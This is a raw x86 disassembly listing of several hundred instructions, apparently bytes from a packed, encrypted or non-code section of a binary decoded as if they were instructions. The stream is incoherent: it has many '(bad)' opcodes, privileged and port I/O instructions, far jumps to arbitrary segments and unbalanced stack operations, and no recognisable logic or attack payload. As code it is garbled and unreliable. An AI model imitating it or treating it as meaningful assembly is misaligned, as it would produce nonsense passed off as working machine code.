  40dd94:	nop
  40dd95:	sub    eax,0xc2a494bd
  40dd9a:	inc    edi
  40dd9b:	inc    esi
  40dd9c:	cdq    
  40dd9d:	push   esp
  40dd9e:	retf   0xa0c7
  40dda1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dda2:	sti    
  40dda3:	xchg   edx,eax
  40dda4:	or     esp,DWORD PTR [ebx-0x4f]
  40dda7:	hlt    
  40dda8:	ss push esi
  40ddaa:	pop    esp
  40ddab:	mov    edx,0xec57cc3f
  40ddb0:	lods   al,BYTE PTR ds:[esi]
  40ddb1:	cmp    DWORD PTR ds:0xf401fe39,esi
  40ddb7:	dec    ebp
  40ddb8:	test   eax,0x6f226656
  40ddbd:	and    dh,BYTE PTR [eax+0x56]
  40ddc0:	stc    
  40ddc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddc2:	mov    edx,0xabfcb1ed
  40ddc7:	(bad)
  40ddcb:	inc    esp
  40ddcc:	mov    edx,0x5dca946c
  40ddd1:	sahf   
  40ddd2:	pop    es
  40ddd3:	aad    0x2
  40ddd5:	loope  0x40ddb0
  40ddd7:	in     al,0x92
  40ddd9:	sar    BYTE PTR [edx],cl
  40dddb:	sbb    bh,BYTE PTR [edx+0x5ef810ee]
  40dde1:	push   esp
  40dde2:	adc    BYTE PTR [eax-0xb466d8c],0x9
  40dde9:	cld    
  40ddea:	fisttp QWORD PTR [ebx-0x17]
  40dded:	push   es
  40ddee:	sub    esp,edx
  40ddf0:	in     al,dx
  40ddf1:	mov    dh,0x30
  40ddf3:	aaa    
  40ddf4:	icebp  
  40ddf5:	jge    0x40ddd7
  40ddf7:	dec    BYTE PTR [ecx+0x59f64477]
  40ddfd:	and    BYTE PTR [edx],al
  40ddff:	lds    edx,FWORD PTR [ebp+0x5fd7551d]
  40de05:	popf   
  40de06:	pop    eax
  40de07:	cmp    ah,BYTE PTR [ebx+0x1419c579]
  40de0d:	or     esi,DWORD PTR [ebx+0x62]
  40de10:	sbb    bh,BYTE PTR [ecx]
  40de12:	fs js  0x40de10
  40de15:	pop    esp
  40de16:	jg     0x40de0c
  40de18:	rcl    DWORD PTR [edx-0x5f],0x15
  40de1c:	xor    dh,al
  40de1e:	stc    
  40de1f:	push   edi
  40de20:	mov    cl,0x68
  40de22:	nop
  40de23:	test   eax,0xebffd257
  40de28:	retf   0x8a
  40de2b:	in     eax,dx
  40de2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de2d:	cmp    ch,BYTE PTR [ecx+0x5a]
  40de30:	mov    WORD PTR ds:0xaead9c42,?
  40de36:	jl     0x40de78
  40de38:	sti    
  40de39:	and    DWORD PTR [esi+0x27a89c43],ebp
  40de3f:	lods   eax,DWORD PTR ds:[esi]
  40de40:	ret    
  40de41:	int3   
  40de42:	jmp    0xb089:0xb8b59c9c
  40de49:	pop    edi
  40de4a:	test   ch,ch
  40de4c:	ins    BYTE PTR es:[edi],dx
  40de4d:	icebp  
  40de4e:	test   BYTE PTR [edx],cl
  40de50:	pop    esi
  40de51:	shl    DWORD PTR [esi+0x5ba3da0f],cl
  40de57:	sub    DWORD PTR [ecx+eiz*1+0x29d134fb],edx
  40de5e:	iret   
  40de5f:	and    dh,BYTE PTR [esp+ebp*4-0x5a]
  40de63:	and    ecx,DWORD PTR [ebp+0x3f]
  40de66:	cmp    BYTE PTR [eax+edi*1],al
  40de69:	push   edi
  40de6a:	push   edx
  40de6b:	add    esi,esi
  40de6d:	pop    edx
  40de6e:	add    dl,BYTE PTR [ecx+edx*2-0x7c]
  40de72:	repz add eax,0xc353c8e9
  40de78:	not    DWORD PTR [eax+0x42]
  40de7b:	repz xchg esp,eax
  40de7d:	or     BYTE PTR [esi+edx*4],bh
  40de80:	cli    
  40de81:	loope  0x40de79
  40de83:	dec    ebp
  40de84:	adc    cl,cl
  40de86:	xchg   BYTE PTR [ecx+0x58],al
  40de89:	push   edi
  40de8a:	inc    DWORD PTR ds:0xb2729367
  40de90:	shl    BYTE PTR [ebp-0x62fcf195],cl
  40de96:	cld    
  40de97:	in     al,dx
  40de98:	xchg   ebx,eax
  40de99:	sbb    DWORD PTR [esi],0xc97b6cf9
  40de9f:	inc    ecx
  40dea0:	add    DWORD PTR [edi-0xf1d45bb],0xf7d5da72
  40deaa:	imul   esp,DWORD PTR [esi+eax*2],0xfffffffe
  40deae:	popf   
  40deaf:	mov    ds:0x11b41f2f,al
  40deb4:	les    esp,FWORD PTR [ebp+0x521d35fa]
  40deba:	cmp    bl,bl
  40debc:	and    eax,DWORD PTR [esi-0x25]
  40debf:	jae    0x40df2f
  40dec1:	xchg   ebx,eax
  40dec2:	push   esp
  40dec3:	push   ds
  40dec4:	mov    bh,0xb6
  40dec6:	xchg   edx,eax
  40dec7:	sub    eax,0x14458c3f
  40decc:	lea    ebx,[edx-0xe]
  40decf:	call   FWORD PTR [ebp-0xf0843ed]
  40ded5:	sub    ch,ch
  40ded7:	and    DWORD PTR [ebx*2+0x6e98cae6],ecx
  40dede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dedf:	sahf   
  40dee0:	(bad)  
  40dee1:	adc    al,0x33
  40dee3:	push   ebx
  40dee4:	cli    
  40dee5:	(bad)  
  40dee6:	(bad)  
  40dee7:	cmc    
  40dee8:	adc    BYTE PTR [ecx+0x15],ah
  40deeb:	aam    0xe7
  40deed:	cmc    
  40deee:	arpl   WORD PTR [eax],sp
  40def0:	imul   BYTE PTR [eax+ebp*8+0x510b0354]
  40def7:	ror    BYTE PTR [edi],cl
  40def9:	(bad)  
  40defa:	adc    al,0x57
  40defc:	arpl   WORD PTR [edx+ecx*4+0x6f],di
  40df00:	jmp    0xfe5f:0xb085ea2d
  40df07:	sbb    ebp,ecx
  40df09:	in     eax,dx
  40df0a:	mov    cl,0xd4
  40df0c:	mov    bl,0xe4
  40df0e:	in     eax,dx
  40df0f:	mov    al,ds:0x52965325
  40df14:	outs   dx,BYTE PTR ds:[esi]
  40df15:	addr16 test al,0xff
  40df18:	and    dl,dh
  40df1a:	rcr    BYTE PTR [edx],0xd0
  40df1d:	jmp    0x40df8c
  40df1f:	rep stos WORD PTR es:[edi],ax
  40df22:	sti    
  40df23:	aaa    
  40df24:	call   0x8ca30945
  40df29:	mov    esi,0xe0bceae8
  40df2e:	(bad)  
  40df2f:	mov    esi,0xa33e1dd
  40df34:	popa   
  40df35:	(bad)  
  40df36:	dec    ebx
  40df37:	push   esi
  40df38:	popf   
  40df39:	mov    ds:0x1b05c590,al
  40df3e:	xor    DWORD PTR [esi-0x4f62ec15],0xffffff88
  40df45:	aam    0x14
  40df47:	test   DWORD PTR [esi+esi*2-0xe],0x27ff920f
  40df4f:	clc    
  40df50:	(bad)  
  40df51:	icebp  
  40df52:	mov    edi,0xaf560fa4
  40df57:	(bad)  
  40df58:	cmp    eax,0x3592fe29
  40df5d:	aad    0x7e
  40df5f:	into   
  40df60:	loop   0x40df32
  40df62:	push   ebp
  40df63:	popf   
  40df64:	popf   
  40df65:	je     0x40dfd1
  40df67:	(bad)  [ebp-0x28]
  40df6b:	int    0xba
  40df6d:	xor    edx,edi
  40df6f:	fs push ss
  40df71:	inc    esi
  40df72:	jb     0x40dfed
  40df74:	sbb    ebx,DWORD PTR [ebx+0x6]
  40df77:	int    0xc2
  40df79:	mov    ch,0x8d
  40df7b:	dec    esp
  40df7c:	aad    0x79
  40df7e:	inc    eax
  40df7f:	stos   BYTE PTR es:[edi],al
  40df80:	jae    0x40dfac
  40df82:	cld    
  40df83:	mov    ebx,ebp
  40df85:	gs mov bl,0xbc
  40df88:	or     eax,0xd686c60b
  40df8d:	loope  0x40df54
  40df8f:	push   0x2a
  40df91:	(bad)  
  40df92:	pushf  
  40df93:	jbe    0x40df2a
  40df95:	adc    DWORD PTR [esi-0x65c70562],ebx
  40df9b:	cmp    dl,BYTE PTR [eax+esi*2]
  40df9e:	fimul  DWORD PTR [esi-0x38607e7c]
  40dfa4:	inc    esi
  40dfa5:	pop    ecx
  40dfa6:	push   0xc0edf253
  40dfab:	pop    ss
  40dfac:	pop    ds
  40dfad:	popa   
  40dfae:	shl    DWORD PTR [edi+0x14b0e548],cl
  40dfb4:	push   ds
  40dfb5:	clc    
  40dfb6:	cmp    BYTE PTR [ebx+0x7e],0x87
  40dfba:	pop    ebx
  40dfbb:	pop    eax
  40dfbc:	leave  
  40dfbd:	adc    ebp,esp
  40dfbf:	push   ecx
  40dfc0:	mov    ah,BYTE PTR [edx+0x137d5f8a]
  40dfc6:	(bad)  
  40dfc7:	(bad)  
  40dfc8:	cmp    BYTE PTR [ebp+0x8],ch
  40dfcb:	adc    DWORD PTR [edx+0x2b95f449],ebp
  40dfd1:	push   cs
  40dfd2:	and    al,0x5c
  40dfd4:	in     eax,dx
  40dfd5:	xor    esp,DWORD PTR [ecx-0x2]
  40dfd8:	xor    eax,0xf390ca97
  40dfdd:	xor    DWORD PTR [ebx],0xffffffb7
  40dfe0:	shr    ebp,0x3c
  40dfe3:	sti    
  40dfe4:	test   al,0x6
  40dfe6:	inc    edx
  40dfe7:	jbe    0x40e058
  40dfe9:	out    0xdb,al
  40dfeb:	xor    al,0x73
  40dfed:	fstp   QWORD PTR [edi]
  40dfef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dff0:	cld    
  40dff1:	aad    0xb1
  40dff3:	stos   BYTE PTR es:[edi],al
  40dff4:	or     DWORD PTR [ecx-0x671b77da],ebp
  40dffa:	lods   eax,DWORD PTR ds:[esi]
  40dffb:	jae    0x40dfdc
  40dffd:	cmp    BYTE PTR [ecx-0x5e],0x78
  40e001:	jmp    0x104b75e3
  40e006:	push   ecx
  40e007:	mov    esi,DWORD PTR [eax]
  40e009:	popa   
  40e00a:	ins    DWORD PTR es:[edi],dx
  40e00b:	lgs    edx,FWORD PTR [ecx+0x4c]
  40e00f:	mov    WORD PTR ds:0xe5c447f,ss
  40e015:	jne    0x40e042
  40e017:	into   
  40e018:	ror    BYTE PTR [edi+ebx*8+0x41],1
  40e01c:	icebp  
  40e01d:	call   0xe5f8:0x1221e468
  40e024:	cld    
  40e025:	add    BYTE PTR [edi],cl
  40e027:	rcl    ebx,1
  40e029:	ret    
  40e02a:	mov    bh,0xc2
  40e02c:	repnz stc 
  40e02e:	xor    dl,BYTE PTR [ecx+0x2f469a3e]
  40e034:	or     DWORD PTR [esi-0x46],esp
  40e037:	dec    eax
  40e038:	push   esp
  40e039:	jnp    0x40dfcc
  40e03b:	std    
  40e03c:	jg     0x40dfeb
  40e03e:	or     cl,BYTE PTR [eax]
  40e040:	rcr    DWORD PTR [eax+0x5a],1
  40e043:	add    DWORD PTR [edx-0x6da22f04],eax
  40e049:	pop    ds
  40e04a:	push   esi
  40e04b:	adc    BYTE PTR [esp+ecx*4+0x1b1ee157],bl
  40e052:	mov    ebp,0xf9832b9a
  40e057:	mov    ch,0xe4
  40e059:	call   0xccfe9fd3
  40e05e:	add    bh,BYTE PTR [edx+eax*4+0x1f]
  40e062:	and    ecx,DWORD PTR [edx-0x1d]
  40e065:	cld    
  40e066:	ficomp WORD PTR [eax]
  40e068:	sub    ah,BYTE PTR [ebx-0x231e3666]
  40e06e:	inc    edx
  40e06f:	and    BYTE PTR [esi+0x3f],al
  40e072:	rol    BYTE PTR [edx],0xa
  40e075:	gs pop esi
  40e077:	dec    ecx
  40e078:	push   ebp
  40e079:	ja     0x40e0db
  40e07b:	je     0x40e0cf
  40e07d:	iret   
  40e07e:	sti    
  40e07f:	push   edi
  40e080:	fldenv [ebx-0x68e12131]
  40e086:	lock fimul DWORD PTR [ecx]
  40e089:	inc    ebp
  40e08a:	or     dh,BYTE PTR [ecx]
  40e08c:	imul   edi,DWORD PTR [ecx+ebx*2],0x4696f2a4
  40e093:	cld    
  40e094:	mov    ecx,DWORD PTR [esi-0x69ae901f]
  40e09a:	into   
  40e09b:	ins    DWORD PTR es:[edi],dx
  40e09c:	test   eax,ebp
  40e09e:	jmp    0x396a6018
  40e0a3:	aam    0xb2
  40e0a5:	sub    bh,BYTE PTR [ecx]
  40e0a7:	dec    eax
  40e0a8:	lea    esp,[ecx-0x67]
  40e0ab:	cli    
  40e0ac:	lods   eax,DWORD PTR ds:[esi]
  40e0ad:	adc    ebx,DWORD PTR [ebx+ecx*8]
  40e0b0:	call   0xca63:0x2e4cc47
  40e0b7:	jge    0x40e0d6
  40e0b9:	sub    eax,0x67bf9af6
  40e0be:	sub    BYTE PTR [ecx],dh
  40e0c0:	into   
  40e0c1:	aas    
  40e0c2:	cdq    
  40e0c3:	repnz mov cs,WORD PTR [esi-0x7e]
  40e0c7:	jmp    0xf67c:0x512ec124
  40e0ce:	push   esi
  40e0cf:	test   BYTE PTR [ebx-0x7e49c490],dh
  40e0d5:	in     al,0x88
  40e0d7:	ins    DWORD PTR es:[edi],dx
  40e0d8:	mov    cl,0x68
  40e0da:	ins    BYTE PTR es:[edi],dx
  40e0db:	stc    
  40e0dc:	inc    eax
  40e0dd:	and    BYTE PTR [eax],0xb9
  40e0e0:	pop    edi
  40e0e1:	ds xor eax,0x5df7d4ea
  40e0e7:	bound  esp,QWORD PTR [edi+0x2e7b288c]
  40e0ed:	sbb    dl,BYTE PTR [eax]
  40e0ef:	retf   0x73e1
  40e0f2:	mov    ch,0x5e
  40e0f4:	sbb    DWORD PTR [ebp-0x39],ebp
  40e0f7:	jmp    0xe78711c3
  40e0fc:	or     BYTE PTR [edi+ebp*2+0x9],dh
  40e100:	jl     0x40e13e
  40e102:	(bad)  
  40e104:	xchg   edx,eax
  40e105:	sar    DWORD PTR [ebp+0x4550bfe1],1
  40e10b:	aad    0x38
  40e10d:	aad    0xf7
  40e10f:	mov    cl,0xda
  40e111:	fiadd  DWORD PTR [edx-0x5c4e6c8a]
  40e117:	xor    ebx,esp
  40e119:	dec    ecx
  40e11a:	dec    eax
  40e11b:	(bad)  
  40e11c:	mov    eax,ds:0x44c63ba4
  40e121:	into   
  40e122:	je     0x40e0c6
  40e124:	push   ebx
  40e125:	loope  0x40e0ec
  40e127:	(bad)  
  40e128:	out    0x83,al
  40e12a:	inc    eax
  40e12b:	(bad)  
  40e12c:	aad    0xf6
  40e12e:	sub    cl,ch
  40e130:	leave  
  40e131:	adc    al,0xa2
  40e133:	repz pop es
  40e135:	mov    ds:0xbd6ec5ba,al
  40e13a:	mov    ebp,0x63f0e41d
  40e13f:	inc    ebp
  40e140:	enter  0x3313,0xbf
  40e144:	sub    ecx,eax
  40e146:	lods   al,BYTE PTR ds:[esi]
  40e147:	(bad)  
  40e148:	cmp    DWORD PTR [edi],edx
  40e14a:	aaa    
  40e14b:	fwait
  40e14c:	xor    dl,dh
  40e14e:	js     0x40e10a
  40e150:	out    dx,eax
  40e151:	imul   esp,eax,0x63
  40e154:	adc    edx,DWORD PTR [edx-0x2e]
  40e157:	clc    
  40e158:	(bad)  
  40e159:	mov    edi,DWORD PTR [esp+ebp*1+0x102c7680]
  40e160:	xor    al,BYTE PTR [ecx+0x73]
  40e163:	cs loop 0x40e1d0
  40e166:	ins    DWORD PTR es:[edi],dx
  40e167:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e168:	inc    edx
  40e169:	(bad)  
  40e16a:	ret    0xc94b
  40e16d:	add    edx,edi
  40e16f:	cmp    ebp,DWORD PTR [edx-0x1b]
  40e172:	test   eax,0x8da5bd9e
  40e177:	into   
  40e178:	ja     0x40e151
  40e17a:	les    edi,FWORD PTR [edi]
  40e17c:	pop    esi
  40e17d:	cld    
  40e17e:	out    0x9,eax
  40e180:	popa   
  40e181:	jmp    0x1c55:0x38f8966
  40e188:	dec    esp
  40e189:	push   edx
  40e18a:	fbstp  TBYTE PTR [edx+0x42716fa9]
  40e190:	mov    esi,0x7329e264
  40e195:	cli    
  40e196:	pop    ss
  40e197:	or     DWORD PTR [esi+ebx*4],ebx
  40e19a:	xchg   esi,eax
  40e19b:	ins    BYTE PTR es:[edi],dx
  40e19c:	sahf   
  40e19d:	xchg   esi,eax
  40e19e:	gs out dx,al
  40e1a0:	call   0x5eaffaed
  40e1a5:	fwait
  40e1a6:	xor    eax,0xa2558ed3
  40e1ab:	mov    esi,0xce8d9d0f
  40e1b0:	daa    
  40e1b1:	pop    ebx
  40e1b2:	jle    0x40e167
  40e1b4:	push   ecx
  40e1b5:	pop    ax
  40e1b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1b8:	cmp    BYTE PTR [edi+0x1c],ah
  40e1bb:	pop    ds
  40e1bc:	jbe    0x40e148
  40e1be:	lods   al,BYTE PTR ds:[esi]
  40e1bf:	ja     0x40e21c
  40e1c1:	and    cl,BYTE PTR [ebx+edi*2-0x58]
  40e1c5:	cmp    al,0x21
  40e1c7:	cmp    BYTE PTR [ebx],0x8a
  40e1ca:	jp     0x40e21a
  40e1cc:	popa   
  40e1cd:	sbb    BYTE PTR [edx],bh
  40e1cf:	mov    esi,0x755d1480
  40e1d4:	retf   
  40e1d5:	scas   eax,DWORD PTR es:[edi]
  40e1d6:	mov    ah,0xa3
  40e1d8:	add    dh,ah
  40e1da:	call   0x816f:0x936288da
  40e1e1:	xor    BYTE PTR [edi+0x3c16397b],al
  40e1e7:	(bad)  
  40e1e8:	inc    esp
  40e1e9:	stc    
  40e1ea:	(bad)  
  40e1eb:	add    cl,dh
  40e1ed:	cmp    eax,0x79ce47ec
  40e1f2:	dec    ebp
  40e1f3:	jle    0x40e233
  40e1f5:	adc    al,0x6a
  40e1f7:	and    DWORD PTR [eax-0x4],edx
  40e1fa:	(bad)  
  40e1fb:	jmp    0xbb15:0xdd959a1a
  40e202:	pop    edi
  40e203:	dec    edx
  40e204:	fcmove st,st(4)
  40e206:	adc    cl,BYTE PTR [ebx+eax*1]
  40e209:	add    BYTE PTR [ecx+edi*1],0x6e
  40e20d:	retf   
  40e20e:	ret    0xcf1e
  40e211:	aad    0xc
  40e213:	adc    DWORD PTR [esi-0x248af4c2],esp
  40e219:	adc    DWORD PTR [esi],0x6b222cdf
  40e21f:	jno    0x40e1e8
  40e221:	xchg   DWORD PTR [esi],ebp
  40e223:	cmp    DWORD PTR [eax],0xfffffff6
  40e226:	aad    0xbd
  40e228:	rcl    DWORD PTR [esi+0x18830c48],cl
  40e22e:	cwde   
  40e22f:	pop    esp
  40e230:	out    dx,eax
  40e231:	jecxz  0x40e288
  40e233:	mov    BYTE PTR [esi+0x6],ah
  40e236:	leave  
  40e237:	loope  0x40e1d4
  40e239:	std    
  40e23a:	adc    BYTE PTR [eax+edx*2-0x43],0xa6
  40e23f:	mov    bh,0x7b
  40e241:	inc    ebp
  40e242:	xchg   edi,eax
  40e243:	test   eax,0xcfeddb2f
  40e248:	or     BYTE PTR [eax+ecx*2-0x3c],bh
  40e24c:	in     al,dx
  40e24d:	rol    DWORD PTR [edi],0xba
  40e250:	push   0xf7ff5813
  40e255:	mov    cs:0x34e835,eax
  40e25b:	or     ebx,ecx
  40e25d:	jb     0x40e236
  40e25f:	jne    0x40e2d0
  40e261:	mov    DWORD PTR [edx+edx*1],eax
  40e264:	ds aas 
  40e266:	pop    ecx
  40e267:	hlt    
  40e268:	iret   
  40e269:	add    ah,al
  40e26b:	addr16 cmp ebp,ebp
  40e26e:	test   al,0x45
  40e270:	xchg   edx,eax
  40e271:	mov    DWORD PTR [esi],edi
  40e273:	and    BYTE PTR [esi-0x1c],0x81
  40e277:	lods   eax,DWORD PTR ds:[esi]
  40e278:	xchg   edi,eax
  40e279:	popf   
  40e27a:	adc    BYTE PTR [eax+eiz*4-0x7a6c8793],dl
  40e281:	xchg   esp,eax
  40e282:	mov    ebx,0x14222234
  40e287:	(bad)  
  40e288:	lock xor al,0xa3
  40e28b:	call   0x261254c
  40e290:	mov    dh,0x3b
  40e292:	xchg   edi,edi
  40e294:	int    0x89
  40e296:	xchg   edx,eax
  40e297:	xchg   ecx,eax
  40e298:	dec    ecx
  40e299:	cs sub eax,0x1ef002b9
  40e29f:	outs   dx,DWORD PTR ds:[esi]
  40e2a0:	pop    ds
  40e2a1:	idiv   BYTE PTR [edi+eax*8]
  40e2a4:	rol    BYTE PTR [edi-0x508792f0],0xf4
  40e2ab:	mov    ss,WORD PTR [ecx+edx*8+0x6b]
  40e2af:	jo     0x40e26d
  40e2b1:	inc    edi
  40e2b2:	push   eax
  40e2b3:	dec    ebx
  40e2b4:	xchg   edx,eax
  40e2b5:	xchg   esi,eax
  40e2b6:	mov    eax,ds:0xeacccfa0
  40e2bb:	add    BYTE PTR [ebp+0x753ae68c],al
  40e2c1:	stos   DWORD PTR es:[edi],eax
  40e2c2:	out    0x3f,eax
  40e2c4:	ja     0x40e33c
  40e2c6:	add    cx,si
  40e2c9:	sbb    BYTE PTR [ebp-0x54f491cf],al
  40e2cf:	mov    ecx,0x2e440523
  40e2d4:	add    BYTE PTR [esi-0x6f987b88],ch
  40e2da:	add    eax,0xf788895b
  40e2df:	xchg   DWORD PTR [ecx],ecx
  40e2e1:	retf   0xf87a
  40e2e4:	add    eax,0x65154405
  40e2e9:	popf   
  40e2ea:	fcomp  DWORD PTR [edi]
  40e2ec:	xchg   edx,eax
  40e2ed:	mov    bh,0xce
  40e2ef:	aaa    
  40e2f0:	cs xchg ebx,eax
  40e2f2:	fisub  DWORD PTR [ecx]
  40e2f4:	lods   eax,DWORD PTR ds:[esi]
  40e2f5:	xchg   edx,eax
  40e2f6:	iret   
  40e2f7:	sub    ch,BYTE PTR [ebx-0x46]
  40e2fa:	ret    
  40e2fb:	add    DWORD PTR [edi+0x1fb81db2],ecx
  40e301:	jp     0x40e334
  40e303:	pusha  
  40e304:	addr16 daa 
  40e306:	push   edx
  40e307:	scas   al,BYTE PTR es:[edi]
  40e308:	push   0x64
  40e30a:	pop    es
  40e30b:	xor    ebp,ebp
  40e30d:	retf   
  40e30e:	pop    ebp
  40e30f:	je     0x40e32c
  40e311:	cmp    DWORD PTR [edx+ebp*4+0x420f2450],ecx
  40e318:	(bad)  
  40e319:	xchg   ebp,eax
  40e31a:	cli    
  40e31b:	add    edi,DWORD PTR [esi+ecx*2-0x4a30c9e2]
  40e322:	cdq    
  40e323:	jle    0x40e38f
  40e325:	mov    al,0x96
  40e327:	out    0x5c,al
  40e329:	pop    eax
  40e32a:	call   DWORD PTR [edi+0x21]
  40e32d:	jnp    0x40e39b
  40e32f:	or     al,0xe5
  40e331:	jle    0x40e32a
  40e333:	test   eax,0x3c4ab420
  40e338:	outs   dx,BYTE PTR ds:[esi]
  40e339:	xor    dh,dl
  40e33b:	daa    
  40e33c:	adc    DWORD PTR [edx],ebp
  40e33e:	sub    eax,0xfc2cc20c
  40e343:	add    esp,ebx
  40e345:	in     eax,dx
  40e346:	imul   edx,DWORD PTR [ebx+0x2a9cd112],0xffffffa1
  40e34d:	ficom  DWORD PTR [ebx+ebp*2]
  40e350:	imul   esi,edi,0xffffffcc
  40e353:	sahf   
  40e354:	inc    edi
  40e355:	mov    DWORD PTR [edx-0x641aa554],esi
  40e35b:	(bad)  
  40e35c:	xor    al,0xde
  40e35e:	jg     0x40e37f
  40e360:	push   edi
  40e361:	das    
  40e362:	imul   edi,DWORD PTR [ebx-0x376f0735],0xffffff84
  40e369:	add    al,0x53
  40e36b:	mov    eax,ds:0xfec90d0c
  40e370:	mov    eax,ds:0xd226df9e
  40e375:	adc    dh,BYTE PTR [edi-0x73e9a536]
  40e37b:	pop    ss
  40e37c:	add    DWORD PTR [ebx+eax*4+0x2de25d08],ebp
  40e383:	xor    dl,BYTE PTR [edx+eax*4+0x72]
  40e387:	dec    ebp
  40e388:	shr    ecx,1
  40e38a:	jae    0x40e34c
  40e38c:	ret    
  40e38d:	int    0x31
  40e38f:	push   0xffffff97
  40e391:	fsubp  st(4),st
  40e393:	jmp    0x4ae360cc
  40e398:	add    DWORD PTR [ebp-0x10],ebx
  40e39b:	or     eax,0x74f98730
  40e3a0:	and    dh,dh
  40e3a2:	push   edi
  40e3a3:	lock jno 0x40e377
  40e3a6:	dec    ebp
  40e3a7:	adc    ebp,ecx
  40e3a9:	sbb    eax,0xdf464d8e
  40e3ae:	xor    BYTE PTR [ecx],cl
  40e3b0:	push   esp
  40e3b1:	stc    
  40e3b2:	jnp    0x40e394
  40e3b4:	cdq    
  40e3b5:	call   0xbb58:0x348c65f0
  40e3bc:	(bad)  
  40e3bd:	xchg   edx,eax
  40e3be:	jne    0x40e43d
  40e3c0:	outs   dx,DWORD PTR ds:[esi]
  40e3c1:	and    al,0x65
  40e3c3:	ins    BYTE PTR es:[edi],dx
  40e3c4:	scas   eax,DWORD PTR es:[edi]
  40e3c5:	(bad)  
  40e3c6:	in     al,0x26
  40e3c8:	mov    esi,0x34510793
  40e3cd:	sti    
  40e3ce:	cmp    al,0xfd
  40e3d0:	aaa    
  40e3d1:	push   ds
  40e3d2:	dec    ebx
  40e3d3:	cmc    
  40e3d4:	add    al,BYTE PTR [edi+0x657aa48c]
  40e3da:	xchg   edi,eax
  40e3db:	or     DWORD PTR [ebx+0x57],0x55
  40e3df:	into   
  40e3e0:	imul   edi,DWORD PTR [edi+ecx*8-0x289e0145],0x19
  40e3e8:	add    BYTE PTR [edx],0x70
  40e3eb:	fld    DWORD PTR [ebp+0x2a1a6bc0]
  40e3f1:	cli    
  40e3f2:	sub    ebp,DWORD PTR [ebx+0x77369532]
  40e3f8:	icebp  
  40e3f9:	aad    0xb7
  40e3fb:	and    eax,0x9a6acc3b
  40e400:	push   esi
  40e401:	sbb    eax,0x68b5a9ad
  40e406:	test   BYTE PTR [ebx+0x79],0x50
  40e40a:	jmp    0x6462:0x14d4dc24
  40e411:	jmp    0x888:0xe9e93658
  40e418:	fiadd  DWORD PTR [eax]
  40e41a:	jo     0x40e3d0
  40e41c:	es mov ebx,0x91b868c0
  40e422:	xor    BYTE PTR [eax+0x12],bh
  40e425:	mov    bh,0xb8
  40e427:	add    DWORD PTR [ecx+0x29],eax
  40e42a:	fwait
  40e42b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e42c:	add    BYTE PTR [ebp+0x7cdd7f28],dh
  40e432:	add    ecx,DWORD PTR [ebx-0xf]
  40e435:	sti    
  40e436:	push   0x2c
  40e438:	mov    ch,0x47
  40e43a:	jb     0x40e49f
  40e43c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e43d:	xchg   BYTE PTR [edx+0x6],al
  40e440:	xor    edx,DWORD PTR [eax]
  40e442:	or     eax,0xcde14137
  40e447:	inc    dl
  40e449:	xchg   esi,eax
  40e44a:	mov    ebp,0xd1d7ccb2
  40e44f:	sbb    dh,ah
  40e451:	xor    BYTE PTR [ebp-0x8],bh
  40e454:	retf   0xbab9
  40e457:	xchg   DWORD PTR [ebp+0x2cd2ab65],eax
  40e45d:	jnp    0x40e448
  40e45f:	add    bl,bh
  40e461:	push   esi
  40e462:	add    DWORD PTR [ebp-0x18d2b7d3],edi
  40e468:	sbb    al,0x22
  40e46a:	mov    al,0xe
  40e46c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e46d:	adc    BYTE PTR [esi],ch
  40e46f:	test   eax,0xa1681fa7
  40e474:	sub    BYTE PTR [ecx+0x7bde6da6],0x4d
  40e47b:	jnp    0x40e48d
  40e47d:	(bad)  
  40e47f:	loop   0x40e405
  40e481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e482:	in     eax,dx
  40e483:	dec    esp
  40e484:	adc    DWORD PTR [ebx],edx
  40e486:	cmp    DWORD PTR [edx+0x706c9adf],esp
  40e48c:	scas   eax,DWORD PTR es:[edi]
  40e48d:	out    0x6a,al
  40e48f:	fdiv   QWORD PTR [ebx-0x60]
  40e492:	repz shr edx,cl
  40e495:	mov    cl,0x60
  40e497:	xchg   ebp,edi
  40e499:	dec    ecx
  40e49a:	add    ah,bh
  40e49c:	sysret 
  40e49e:	imul   ebp,DWORD PTR [ebx-0x25],0xa913b951
  40e4a5:	mov    ecx,0x4f218f95
  40e4aa:	pusha  
  40e4ab:	out    dx,eax
  40e4ac:	shr    DWORD PTR [esi+0x195ccf26],0xd9
  40e4b3:	add    DWORD PTR [edx-0x32],edx
  40e4b6:	and    al,0x66
  40e4b8:	icebp  
  40e4b9:	push   ebx
  40e4ba:	cwde   
  40e4bb:	xchg   BYTE PTR ds:0x666cba96,dh
  40e4c1:	xchg   ebp,eax
  40e4c2:	iret   
  40e4c3:	inc    ecx
  40e4c4:	inc    eax
  40e4c5:	pop    ss
  40e4c6:	fld    QWORD PTR [eax+0x1d]
  40e4c9:	add    DWORD PTR [ecx-0x24],edx
  40e4cc:	cmp    ah,BYTE PTR [ecx]
  40e4ce:	sti    
  40e4cf:	mov    ?,ebp
  40e4d1:	pop    ecx
  40e4d2:	cmp    ah,al
  40e4d4:	mov    edx,DWORD PTR [edi-0x3ee91c81]
  40e4da:	dec    edx
  40e4db:	jnp    0x40e525
  40e4dd:	je     0x40e4ac
  40e4df:	pop    ds
  40e4e0:	nop
  40e4e1:	mov    ds:0x577e6019,al
  40e4e6:	call   0x5c4b:0x8be9dbc5
  40e4ed:	shr    dl,1
  40e4ef:	ret    0xb40
  40e4f2:	add    BYTE PTR [esi-0x23745788],al
  40e4f8:	daa    
  40e4f9:	xchg   ebx,eax
  40e4fa:	or     edx,DWORD PTR [edi]
  40e4fc:	test   al,0x54
  40e4fe:	int    0x35
  40e500:	enter  0x7303,0xa5
  40e504:	mov    ah,0xa0
  40e506:	jl     0x40e4a4
  40e508:	aam    0xa
  40e50a:	mov    al,BYTE PTR [edx]
  40e50c:	and    ebp,ebx
  40e50e:	push   edi
  40e50f:	jmp    0xf6713f12
  40e514:	push   esi
  40e515:	jl     0x40e595
  40e517:	nop
